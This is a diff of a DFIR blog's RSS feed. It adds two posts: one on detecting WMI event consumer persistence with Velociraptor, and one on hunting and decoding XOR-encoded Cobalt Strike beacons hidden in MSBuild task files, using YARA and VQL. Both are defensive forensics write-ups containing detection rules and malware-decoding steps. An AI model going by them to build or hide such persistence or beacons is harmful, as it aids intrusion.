@@ -5,9 +5,501 @@
     <description>A blog for DFIR thoughts, research and for my future reference</description>
     <link>https://mgreen27.github.io/</link>
     <atom:link href="https://mgreen27.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 25 Jul 2020 00:20:33 +1000</pubDate>
-    <lastBuildDate>Sat, 25 Jul 2020 00:20:33 +1000</lastBuildDate>
+    <pubDate>Sat, 02 Jul 2022 15:49:09 +0000</pubDate>
+    <lastBuildDate>Sat, 02 Jul 2022 15:49:09 +0000</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>WMI Event Consumers: what are you missing?</title>
+        <description>&lt;p&gt;WMI Eventing is a fairly well known technique in DFIR, however some
+tools may not provide the coverage you expect. This article covers
+WMI eventing visibility and detection including custom namespaces.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/00SelectionBias.png&quot; alt=&quot;Selection bias in WWII: missing what is not collected.&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;
+
+&lt;p&gt;There has been a fair bit of research and observations of WMI eventing
+in field over the last years. In short, a WMI event consumer is a
+method of subscribing to certain system events, then enabling an action
+of some sort. Common adversary use cases may include persistence, privilege
+escalation, or as a collection trigger. Represented as ATT&amp;amp;CK T1546.003
+this technique has been observed in use from APT, through to trash-tic
+worm and coin miner threats.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/01WMIOverview.png&quot; alt=&quot;WMI Eventing: 3 system classes&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are three system classes in every active event consumer:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;__EventFilter is a WQL query that outlines the trigger event of
+interest.&lt;/li&gt;
+  &lt;li&gt;__EventConsumer is an action to perform upon triggering an event.&lt;/li&gt;
+  &lt;li&gt;__FilterToConsumerBinding is the registration mechanism that binds
+a filter to a consumer.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Most detection will focus on collecting the WMI classes in root/subscription
+and, in some tools root/default WMI namespaces.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/02Autoruns.png&quot; alt=&quot;Autoruns 14.07: detects root/default and root/subscription namespace WMI event consumers&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;custom-namespaces&quot;&gt;Custom Namespaces&lt;/h4&gt;
+
+&lt;p&gt;At Blackhat 2018 Lee Christensen and Matt Graeber presented “Subverting
+Sysmon: Application of a Formalized Security Product Evasion Methodology”.
+This excellent talk focused on defense evasion methodology and highlighted
+potential collection gaps in telemetry tools around WMI eventing. In this
+case, the focus was on Sysmon behaviour of collection only in
+root/subscription, interestingly, it also highlighted the possibility to
+implement __EventConsumer classes in arbitrary namespaces.&lt;/p&gt;
+
+&lt;p&gt;It is detection of WMI Event Consumers in arbitrary namespaces that I’m going
+to focus. For anyone interested in testing I have written
+&lt;a href=&quot;https://github.com/mgreen27/mgreen27.github.io/blob/master/static/other/WMIEventingNoisemaker/WmiEventingNoisemaker.ps1&quot;&gt;a script to generate WMI event consumers&lt;/a&gt;.
+This script wraps several powershell functions released during the Black
+Hat talk to test creating working event consumers.&lt;/p&gt;
+
+&lt;p&gt;First step was to create a custom namespace event consumer. In this
+instance I selected the namespace name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;totallylegit&lt;/code&gt; and attached an
+ActiveScript event consumer.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/04WMIEventGeneration.png&quot; alt=&quot;WMIEventingNoismaker.ps1:Generate active script EventConsumer&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;collection&quot;&gt;Collection&lt;/h2&gt;
+
+&lt;p&gt;Velociraptor has several valuable artifacts for hunting WMI Event
+Consumers:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows.Sysinternals.Autoruns&lt;/code&gt; - leverages a thirdparty deployment of
+Sysinternals Autoruns and typically my go to ASEP collection artifact but
+limited by visibility in root/default and root/subscription only.&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows.Persistence.PermanentWMIEvents&lt;/code&gt; - recently upgraded to query
+all ROOT namespaces.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;This artifact reports currently deployed permanent WMI Event Consumers.&lt;/li&gt;
+  &lt;li&gt;The artifact collects Binding information, then presents associated Filters and Consumers.&lt;/li&gt;
+  &lt;li&gt;Target a specific namespace, or tick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllRootNamespaces&lt;/code&gt; to collect all
+root namespace event consumers.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/05collection.png&quot; alt=&quot;Windows.Persistence.PermanentWMIEvents: configuration options&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/05collection_results.png&quot; alt=&quot;Windows.Persistence.PermanentWMIEvents: results&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;telemetry&quot;&gt;Telemetry&lt;/h4&gt;
+
+&lt;p&gt;Unfortunately prior to Windows 10 WMI logging was fairly limited. Sysmon and
+other telemetry sources often rely on WMI eventing itself to collect WMI
+eventing telemetry events. That means custom classes require namespace and
+class existence prior to telemetry subscription. Sysmon as seen below also
+does not have coverage for root/default namespace.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/03SysmonEid20.png&quot; alt=&quot;Sysmon collection: Event ID 20 mapping (`__EventConsumer`)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The good news is since Windows 10, WMI logging has improved significantly
+and we can now query the event log: Microsoft-Windows-WMI-Activity or
+subscribe the underlying ETW provider of the same name. In the VQL below
+I filter the ETW event on event consumer creation or delete operations.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vql&quot;&gt;SELECT
+    System.TimeStamp AS EventTime,
+    System.ID as EventId,
+    strip(prefix='\\\\\.\\',string=EventData.NamespaceName) as NamespaceName,
+    EventData.Operation as Operation,
+    GetProcessInfo(TargetPid=int(int=EventData.ClientProcessId))[0] as Process
+FROM watch_etw(guid=&quot;{1418ef04-b0b4-4623-bf7e-d74ab47bbdaa}&quot;)
+WHERE EventId = 11
+    AND Operation =~ 'WbemServices::(PutInstance|DeleteInstance|PutClass|DeleteClass)'
+    AND Operation =~ 'EventConsumer|EventFilter|FilterToConsumerBinding'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I have included a completed artifact in the artifact exchange:
+&lt;a href=&quot;https://docs.velociraptor.app/exchange/artifacts/pages/wmieventing/&quot;&gt;Windows.ETW.WMIEventing&lt;/a&gt;.
+That artifact includes process enrichment, targeting both creation and deletion of EventConsumers.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/06ETW.png&quot; alt=&quot;Custom namespace provider registration and process enrichment&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/06ETWb.png&quot; alt=&quot;Windows.ETW.WMIEventing: all operations event consumer creation and removal&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;event-log&quot;&gt;Event Log&lt;/h4&gt;
+
+&lt;p&gt;Similar filters can be used with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows.EventLogs.EvtxHunter&lt;/code&gt; for
+detection. Its worthy to note, event logs hold less verbose logging for
+the registration than ETW but this use case is helpful when coming late
+to the party during an investigation.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/07EvtxHunter.png&quot; alt=&quot;Windows.EventLogs.EvtxHunter: hunt for event consumer string&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2022-01-12-wmi-eventing/07EvtxHunterb.png&quot; alt=&quot;Windows.EventLogs.EvtxHunter: detect event consumer class creation&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusions&quot;&gt;Conclusions&lt;/h1&gt;
+
+&lt;p&gt;During this post, we have shown three techniques for detecting WMI event consumers
+that are worth considering. We can collect these data-points over an entire
+network in minutes using Velociraptor’s “hunt” capability. Similarly
+Velociraptor notebook workflow assists excluding known good entries quickly as part of analysis.&lt;/p&gt;
+
+&lt;p&gt;The Velociraptor platform aims to provide visibility and access
+to endpoint data. If you would like to try Velociraptor it is available on Github under an open source license.
+As always, please file issues on the bug tracker or ask questions on our
+mailing list velociraptor-discuss@googlegroups.com. You can also chat with
+us directly on discord at https://www.velocidex.com/discord&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi&quot;&gt;Microsoft documentation, About WMI&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://attack.mitre.org/techniques/T1546/003/&quot;&gt;MITRE ATT&amp;amp;CK T1546.003, Event Triggered Execution: Windows Management Instrumentation Event Subscription&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=R5IEyoFpZq0&quot;&gt;Christensen.L and Graeber.M, Blackhat 2018 - Subverting Sysmon: Application of a Formalized Security Product Evasion Methodology&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/jsecurity101/Windows-API-To-Sysmon-Events/&quot;&gt;JSecurity101, Windows APIs To Sysmon-Events&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        <pubDate>Wed, 12 Jan 2022 00:00:00 +0000</pubDate>
+        <link>https://mgreen27.github.io//posts/2022/01/12/wmi-eventing.html</link>
+        <guid isPermaLink="true">https://mgreen27.github.io/posts/2022/01/12/wmi-eventing.html</guid>
+        
+        <category>DFIR</category>
+        
+        <category>WMI</category>
+        
+        <category>Detection</category>
+        
+        <category>VQL</category>
+        
+        <category>ASEP</category>
+        
+        <category>ETW</category>
+        
+        
+        <category>posts</category>
+        
+      </item>
+    
+      <item>
+        <title>Cobalt Strike Payload Discovery And Data Manipulation In VQL</title>
+        <description>&lt;p&gt;Velociraptor’s ability for data manipulation is a core platform capability
+that drives a lot of the great content we have available in terms of data
+parsing for artifacts and live analysis. After a recent engagement with
+less common encoded Cobalt Strike beacons, and finding sharable files on
+VirusTotal,  I thought it would be a good opportunity to walk through some
+workflow around data manipulation with VQL for analysis. In this post I
+will walk though some background, collection at scale, and finally talk
+about processing target files to extract key indicators.&lt;/p&gt;
+
+&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;
+
+&lt;p&gt;The Microsoft Build Engine (MSBuild.exe) is a signed Windows binary that
+can  be used to load C# or Visual Basic code via an inline task project
+file. Legitimately used in Windows software development, it can handle XML
+formatted task files that define requirements for loading and building
+Visual Studio configurations. Adversaries can abuse this mechanism for
+execution as defence evasion and to bypass application whitelisting -
+&lt;a href=&quot;https://attack.mitre.org/techniques/T1127/001/&quot;&gt;ATT&amp;amp;CK T1127&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In this particular engagement, the Rapid7 MDR/IR team responded to an
+intrusion in which during lateral movement, the adversary dropped many
+variants of an MSBuild inline task file to several machines and then
+executed MSBuild via wmi to load an embedded Cobalt Strike beacon.
+Detecting an in memory Cobalt Strike beacon is trivial for active threats
+with our process based yara and carving content.&lt;/p&gt;
+
+&lt;p&gt;The problem in this case was: how do you discover, then decode these encoded
+files on disk quickly to find any additional scope using Velociraptor?&lt;/p&gt;
+
+&lt;h2 id=&quot;collection&quot;&gt;Collection&lt;/h2&gt;
+
+&lt;p&gt;First task is discovery and collecting our files in scope from the network.
+Typically this task may be slow to deploy or rely on cobbled together
+capabilities from other teams. The Velociraptor hunt is an easy button for
+this use case.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/01_new_hunt.png&quot; alt=&quot;Velociraptor GUI : hunt : add hunt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Velociraptor has several valuable artifacts for hunting over Windows file
+systems with yara: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows.Detection.Yara.NTFS&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Generic.Detection.Yara.Glob&lt;/code&gt;
+spring to mind readily.  In this instance I am selecting Yara.NTFS. I have
+leveraged this artifact in the field for hunting malware, searching logs or
+any other capability where both metadata and content based discovery is desired.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;This artifact searches the MFT, returns a list of target files then runs Yara over the target list.&lt;/li&gt;
+  &lt;li&gt;The artifact leverages &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows.NTFS.MFT&lt;/code&gt; so similar regex filters can be applied including Path, Size and date.&lt;/li&gt;
+  &lt;li&gt;The artifact also has an option to search across all attached drives and upload any files with Yara hits.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Some examples of path regex may include:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Extension at a path: Windows/System32/.+\.dll$&lt;/li&gt;
+  &lt;li&gt;More wildcards: Windows/.+/.+\.dll$&lt;/li&gt;
+  &lt;li&gt;Specific file: Windows/System32/kernel32.dll$&lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;Multiple extentions: .(php&lt;/td&gt;
+          &lt;td&gt;aspx&lt;/td&gt;
+          &lt;td&gt;resx&lt;/td&gt;
+          &lt;td&gt;asmx)$&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/02_find_artifact.png&quot; alt=&quot;Select artifact : Windows.Detection.Yara.NTFS&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The file filter: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows/Temp/[^/]*\.TMP$&lt;/code&gt; will suffice in this case to target
+our adversaries path for payloads before applying our yara rule. Typically when
+running discovery like this, an analyst can also apply additional options like
+file size or time stamp bounds for use at scale and optimal performance.
+The yara rule deployed in this case was simply quick and dirty hex conversion of
+text directly from the project file referencing the unique variable setup that
+was common across acquired samples.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yara&quot;&gt;rule MSBuild_buff {
+   meta:
+      description = &quot;Detect unique variable setup MSBuild inline task project file&quot;
+      author = &quot;Matt Green - @mgreen27&quot;
+      date = &quot;2021-10-22&quot;
+   strings:
+    // byte[] buff = new byte[]
+    $buff = { 62 79 74 65 5b 5d 20 62 75 66 66 20 3d 20 6e 65 77 20 62 79 74 65 5b 5d }
+
+    // byte[] key_code = new byte[]
+    $key_code = { 62 79 74 65 5b 5d 20 6b 65 79 5f 63 6f 64 65 20 3d 20 6e 65 77 20 62 79 74 65 5b 5d }
+
+condition:
+      any of them
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/03_configure_artifact.png&quot; alt=&quot;Windows.Detection.Yara.NTFS hunt configuration&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After launching the hunt, results become available inside the hunt entry on the
+Velociraptor server for download or additional analysis.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/04_hunt_results.png&quot; alt=&quot;Hunt results&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;payload-decode&quot;&gt;Payload decode&lt;/h2&gt;
+&lt;p&gt;The Cobalt Strike payload is a string with represented characters xor encoded
+as a hex formatted buffer and key in embedded C Sharp code as seen below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/05_payload_b.png&quot; alt=&quot;MSBuild inline task project file with CobaltStrike payload&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;enumerate-collected-files-and-find-location-on-server&quot;&gt;Enumerate collected files and find location on server&lt;/h3&gt;
+&lt;p&gt;So far we have only collected files that have suspicious content. Now we want
+to post process the result and try to extract more information from the payload.&lt;/p&gt;
+
+&lt;p&gt;The Velociraptor notebook is a gui component that lets the user run VQL directly
+on the server. In this case we are leveraging the notebook attached to our hunt
+to post process results opposed to downloading the files and processing offline.&lt;/p&gt;
+
+&lt;p&gt;Our first step of decode is to examine all the files we collected in the hunt.
+The first query enumerates all the individual collections in the hunt, while the
+second query retrieves the files collected for each job.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vql&quot;&gt;-- find flow ids for each client
+LET hunt_flows = SELECT *, Flow.client_id as ClientId, Flow.session_id as FlowId
+FROM hunt_flows(hunt_id='H.C6508PLOOPD2U')
+
+-- extract uploaded files and path on server
+Let targets = SELECT  * FROM foreach(row=hunt_flows,
+    query={
+        SELECT
+            file_store(path=vfs_path) as SamplePath,
+            file_size as SampleSize
+        FROM uploads(client_id=ClientId,flow_id=FlowId)
+    })
+
+SELECT * FROM targets
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/06_notebook_files.png&quot; alt=&quot;Find the location of all files collected&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;extract-encoded-payload-and-xor-key&quot;&gt;Extract encoded payload and xor key&lt;/h3&gt;
+&lt;p&gt;For the second step, to extract target bytes we leverage the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_records_with_regex()&lt;/code&gt;
+plugin to extract the strings of interest (Data and Key) in our target files.
+Note: the buffer_size argument allows VQL to examine a larger buffer than the
+default size in order to capture the typically very large payloads in these build
+files. We have also included a 200 character limitation on the data field initially
+as this will improve performance when working on VQL. We have also specified buffer
+size to be larger than default and just larger than the biggest payload in scope.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vql&quot;&gt;-- regex to extract Data and Key fields
+LET target_regex = 'buff = new byte\\[\\]\\s*{(?P&amp;lt;Data&amp;gt;[^\\n]*)};\\s+byte\\[\\]\\s+key_code = new byte\\[\\]\\s*{(?P&amp;lt;Key&amp;gt;[^\\n]*)};\\n'
+
+SELECT * FROM foreach(row=targets,
+    query={
+        SELECT
+            basename(path=SamplePath) as Sample,
+            SampleSize,
+            Key, --obtained from regex
+            read_file(filename=Data,accessor='data',length=200) as DataExtract -- obtained by regex, only output 200 characters
+        FROM parse_records_with_regex(
+            file=SamplePath,buffer_size=15000000,
+            regex=target_regex)
+    })
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_records_with_regex()&lt;/code&gt; is a VQL plugin that parses a file with a set of regexp and yields matches as records. The file is read into a large buffer. Then each regular expression is applied to the buffer, and all matches are emitted as rows.&lt;/p&gt;
+
+&lt;p&gt;The regular expressions are specified in the Go syntax. They are expected to contain capture variables to name the matches extracted.&lt;/p&gt;
+
+&lt;p&gt;The aim of this plugin is to split the file into records which can be further parsed. For example, if the file consists of multiple records, this plugin can be used to extract each record, while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_string_with_regex()&lt;/code&gt; can be used to further split each record into elements. This works better than trying to write a more complex regex which tries to capture a lot of details in one pass.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/07_notebook_regex.png&quot; alt=&quot;VQL: extract data and keys&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;extract-normalisation&quot;&gt;Extract normalisation&lt;/h3&gt;
+
+&lt;p&gt;The third step adds a custom function for hex normalisation and converts the inline
+C Sharp style encoding to a standard hex encoded string which VQL can easily parse.
+In this case, the local normalise function will ensure we have  valid 2 character hex.
+The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;regex_replace()&lt;/code&gt; will strip the leading ‘0x’ from the hex strings and prepare for
+xor processing.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vql&quot;&gt;-- regex to extract Data and Key fields
+LET target_regex = 'buff = new byte\\[\\]\\s*{(?P&amp;lt;Data&amp;gt;[^\\n]*)};\\s+byte\\[\\]\\s+key_code = new byte\\[\\]\\s*{(?P&amp;lt;Key&amp;gt;[^\\n]*)};\\n'
+
+-- normalise function to fix bad hex strings
+LET normalise_hex(value) = regex_replace(source=value,re='0x(.)[,}]',replace='0x0\$1,')
+
+SELECT * FROM foreach(row=targets,
+    query={
+        SELECT
+            basename(path=SamplePath) as Sample,
+            SampleSize,
+            regex_replace(re=&quot;0x|,&quot;, replace=&quot;&quot;, source=normalise_hex(value=Key)) as KeyNormalised,
+            regex_replace(re=&quot;0x|,&quot;, replace=&quot;&quot;, source=normalise_hex(value=Data)) as DataNormalised
+        FROM parse_records_with_regex(
+            file=SamplePath,buffer_size=15000000,
+            regex=target_regex)
+    })
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/08_notebook_normalise.png&quot; alt=&quot;VQL: hex normalisation&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;extract-to-bytes&quot;&gt;Extract to bytes&lt;/h3&gt;
+
+&lt;p&gt;The fourth step converts hex to bytes and validates that the next stage is working. In the example VQL below
+we pass the hex text to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unhex()&lt;/code&gt; function to produce raw bytes for our variables.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vql&quot;&gt;SELECT * FROM foreach(row=targets,
+    query={
+        SELECT
+            basename(path=SamplePath) as Sample,
+            SampleSize,
+            unhex(string=regex_replace(re=&quot;0x|,&quot;, replace=&quot;&quot;, source=normalise_hex(value=Key))) as KeyBytes,
+            read_file(filename=
+                unhex(string=regex_replace(re=&quot;0x|,&quot;, replace=&quot;&quot;, source=normalise_hex(value=Data))),
+                    accessor='data',length=200) as DataBytesExtracted
+        FROM parse_records_with_regex(
+            file=SamplePath,buffer_size=15000000,
+            regex=target_regex)
+    })
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/09_notebook_bytes.png&quot; alt=&quot;VQL: extract bytes&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;xor-decode&quot;&gt;Xor decode&lt;/h3&gt;
+
+&lt;p&gt;VQL’s flexibility comes with its ability to reuse existing artifacts in different ways.
+The fifth step is running Velociraptor’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor()&lt;/code&gt; function and piping the output into our
+the existing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows.Carving.CobaltStrike()&lt;/code&gt; configuration decoder.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vql&quot;&gt;-- extract bytes
+LET bytes &amp;lt;= SELECT * FROM foreach(row=targets,
+    query={
+        SELECT
+            SamplePath, basename(path=SamplePath) as Sample, SampleSize,
+            unhex(string=regex_replace(re=&quot;0x|,&quot;, replace=&quot;&quot;, source=normalise_hex(value=Key))) as KeyBytes,
+            read_file(filename=
+                unhex(string=regex_replace(re=&quot;0x|,&quot;, replace=&quot;&quot;, source=normalise_hex(value=Data))),
+                    accessor='data') as DataBytes
+        FROM parse_records_with_regex(
+            file=SamplePath,buffer_size=15000000,
+            regex=target_regex)
+    })
+
+-- pass bytes to cobalt strike parser and format key indicators im interested in
+SELECT *, FROM foreach(row=bytes,query={
+    SELECT *,
+        basename(path=SamplePath) as Sample,SampleSize
+    FROM Artifact.Windows.Carving.CobaltStrike(TargetBytes=xor(key=KeyBytes,string=DataBytes))
+})
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/10_notebook_parse.png&quot; alt=&quot;VQL: parse config&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Decoded Cobalt Strike configuration is clearly observed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/11_notebook_config_example.png&quot; alt=&quot;Cobalt strike configuration example&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The smallest file also includes a Cobalt Strike shellcode stager, which I have recently
+added to the Velociraptor Cobalt Strike parser.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/12_notebook_shellcode_example.png&quot; alt=&quot;Cobalt strike shellcode example&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;additional-analysis&quot;&gt;Additional analysis&lt;/h3&gt;
+
+&lt;p&gt;Finally, we may have a desire to extract specific key indicators and compare across
+samples. A simple data stack on key indicators of interest.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vql&quot;&gt;-- pass bytes to cobalt strike parser and format key indicators im interested in
+LET cobalt = SELECT *, FROM foreach(row=bytes,query={
+    SELECT
+        basename(path=SamplePath) as Sample,SampleSize,
+        Hash as DecodeHash,
+        Rule,Offset,Xor,DecodedConfig
+    FROM Artifact.Custom.Windows.Carving.CobaltStrike(TargetBytes=xor(key=KeyBytes,string=DataBytes))
+})
+
+-- quick data stack on a few things to show sample analysis
+SELECT count() as Total,
+    if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.BeaconType, else= 'Shellcode stager') as Type,
+    if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.LicenseId, else= DecodedConfig.Licence) as License,
+    if(condition= Xor=~'^0x(2e|69)$', then=dict(SpawnTox86=DecodedConfig.SpawnTox86,SpawnTox64=DecodedConfig.SpawnTox64), else= 'N/A') as SpawnTo,
+    if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.Port, else= 'N/A') as Port,
+    if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.C2Server, else= DecodedConfig.Server) as Server
+FROM cobalt
+GROUP BY Type, Licence,SpawnTo,Port,Server
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2021-11-21-cobalt/13_notebook_example.png&quot; alt=&quot;VQL results: key indicators of interest&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusions&quot;&gt;Conclusions&lt;/h2&gt;
+
+&lt;p&gt;In this post we showed discovery, then decode of encoded Cobalt Strike beacons on disk.
+Velociraptor can read, manipulate and enrich data efficiently across a large network
+without the overhead of needing to extract and process manually.&lt;/p&gt;
+
+&lt;p&gt;Whilst most traditional workflows concentrate on collection and offline analysis,
+Velociraptor notebook also enables data manipulation and flexibility in analysis.
+If you would like to try out these features in Velociraptor, It is available on
+&lt;a href=&quot;https://github.com/Velocidex/velociraptor&quot;&gt;GitHub&lt;/a&gt; under an open source license. 
+Please follow the project or ask questions on our mailing list
+velociraptor-discuss@googlegroups.com. You can also chat with us directly on 
+&lt;a href=&quot;https://www.velocidex.com/discord&quot;&gt;discord&lt;/a&gt;.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 09 Nov 2021 00:00:00 +0000</pubDate>
+        <link>https://mgreen27.github.io//posts/2021/11/09/VQL.html</link>
+        <guid isPermaLink="true">https://mgreen27.github.io/posts/2021/11/09/VQL.html</guid>
+        
+        <category>DFIR</category>
+        
+        <category>detection</category>
+        
+        <category>cobaltstrike</category>
+        
+        <category>VQL</category>
+        
+        
+        <category>posts</category>
+        
+      </item>
     
       <item>
         <title>Windows IPSEC for endpoint quarantine</title>
@@ -56,7 +548,7 @@ NOTE: when deleting a policy it is disabled and all policy objects are also dele
     &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;description=[&amp;lt;string&amp;gt;]&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;For example: Allowing RDP traffic inbound to a machine from any IP&lt;br /&gt;
-(Example only for testing - stay away from this rule in an IR!)  &lt;br /&gt;
+(Example only - stay away from this rule in an IR)  &lt;br /&gt;
 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netsh ipsec static add filter filterlist=&quot;Test Filter List&quot;&lt;/code&gt;&lt;br /&gt;
     &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;srcaddr=me srcport=3389 dstaddr=any dstport=0 protocol=tcp&lt;/code&gt;  &lt;br /&gt;
     &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;description=&quot;quick and dirty RDP filter&quot;&lt;/code&gt;&lt;/p&gt;
@@ -157,7 +649,7 @@ This enables custom IPSec filters to be added to the permit or block rule config
 &lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Thu, 23 Jul 2020 00:00:00 +1000</pubDate>
+        <pubDate>Thu, 23 Jul 2020 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io//posts/2020/07/23/IPSEC.html</link>
